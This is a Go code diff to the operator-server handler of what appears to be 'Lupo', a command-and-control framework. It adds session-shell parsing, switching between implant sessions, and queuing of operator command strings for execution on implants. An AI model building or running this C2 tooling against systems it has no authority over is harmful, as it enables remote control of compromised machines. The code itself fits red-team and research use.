@@ -50,6 +50,10 @@ func WolfPackServerHandler(w http.ResponseWriter, r *http.Request) {
 // Username - a unique Username that is defined by the operator administering wolfpack server users. This is sent to identify what user is connecting.
 //
 // Command - a command issued by a user to be transmitted and executed by the Lupo server
+//
+// Polling - boolean status indicator to know if the incoming request was from the Lupo client polling functions or the user
+//
+// ActiveSession - the active session an operator is interacting with when executing commands, only applies to session sub-shell/nested shell commands
 
 func handleWolfPackRequests(w http.ResponseWriter, r *http.Request) {
 
@@ -59,6 +63,8 @@ func handleWolfPackRequests(w http.ResponseWriter, r *http.Request) {
 	var getUsername string
 	var getCommand []string
 	var getPolling = false
+	var getIsSessionShell = false
+	var getActiveSession int
 
 	// Get the Remote Address of the Implant from the request
 	remoteAddr := r.RemoteAddr
@@ -86,7 +92,7 @@ func handleWolfPackRequests(w http.ResponseWriter, r *http.Request) {
 		polling, err := strconv.ParseBool(getParams["polling"][0])
 
 		if err != nil {
-			errorString := "wolfpack GET Request could not parse polling parameter as bool, request ignored"
+			errorString := "wolfpack GET Request could not parse getPolling parameter as bool, request ignored"
 			core.LogData(errorString)
 			returnErr := errors.New(errorString)
 			ErrorHandler(returnErr)
@@ -94,6 +100,35 @@ func handleWolfPackRequests(w http.ResponseWriter, r *http.Request) {
 		}
 
 		getPolling = polling
+	}
+
+	if len(getParams["isSessionShell"]) > 0 {
+		isSessionShell, err := strconv.ParseBool(getParams["isSessionShell"][0])
+
+		if err != nil {
+			errorString := "wolfpack GET Request could not parse getIsSessionShell parameter as bool, request ignored"
+			core.LogData(errorString)
+			returnErr := errors.New(errorString)
+			ErrorHandler(returnErr)
+			return
+		}
+
+		if len(getParams["activeSession"]) > 0 {
+
+			fmt.Println(getParams["activeSession"][0])
+			activeSession, err := strconv.Atoi(getParams["activeSession"][0])
+
+			if err != nil {
+				errorString := "wolfpack GET Request could not convert getActiveSession parameter as int, request ignored"
+				core.LogData(errorString)
+				returnErr := errors.New(errorString)
+				ErrorHandler(returnErr)
+				return
+			}
+			getActiveSession = activeSession
+		}
+
+		getIsSessionShell = isSessionShell
 	}
 
 	if getPSK != core.Wolves[getUsername].WolfPSK {
@@ -123,7 +158,47 @@ func handleWolfPackRequests(w http.ResponseWriter, r *http.Request) {
 		IsWolfPackExec = true
 		core.LogData(getUsername + "@" + remoteAddr + " executed: " + strings.Join(getCommand, " "))
 
-		WolfPackApp.RunCommand(getCommand)
+		if getIsSessionShell {
+
+			if getCommand[0] == "back" {
+				core.LogData(getUsername + " executed: back")
+
+			} else if getCommand[0] == "session" {
+
+				session, err := strconv.Atoi(getCommand[1])
+
+				if err != nil {
+					errorString := "wolfpack GET Request could not convert session ID to int, request ignored..."
+					core.LogData(errorString)
+					returnErr := errors.New(errorString)
+					ErrorHandler(returnErr)
+					return
+				}
+				sessionExists := core.SessionExists(session)
+
+				if sessionExists {
+					core.AssignWolfResponse(CurrentOperator, core.Wolves[CurrentOperator].Rhost, "true")
+					core.LogData(CurrentOperator + " executed: session " + getCommand[1])
+
+				} else {
+					core.AssignWolfResponse(CurrentOperator, core.Wolves[CurrentOperator].Rhost, "false")
+					core.LogData(CurrentOperator + " executed: session " + getCommand[1])
+				}
+
+			} else if getCommand[0] == "cmd" {
+
+				var cmdString string
+				if len(getParams["cmdString"]) > 0 {
+					cmdString = getParams["cmdString"][0]
+				}
+				core.LogData(CurrentOperator + " executed on session " + strconv.Itoa(getActiveSession) + ": cmd " + cmdString)
+				core.QueueImplantCommand(getActiveSession, cmdString, CurrentOperator)
+
+			}
+		} else {
+			WolfPackApp.RunCommand(getCommand)
+
+		}
 
 		currentWolf := core.Wolves[getUsername]
 
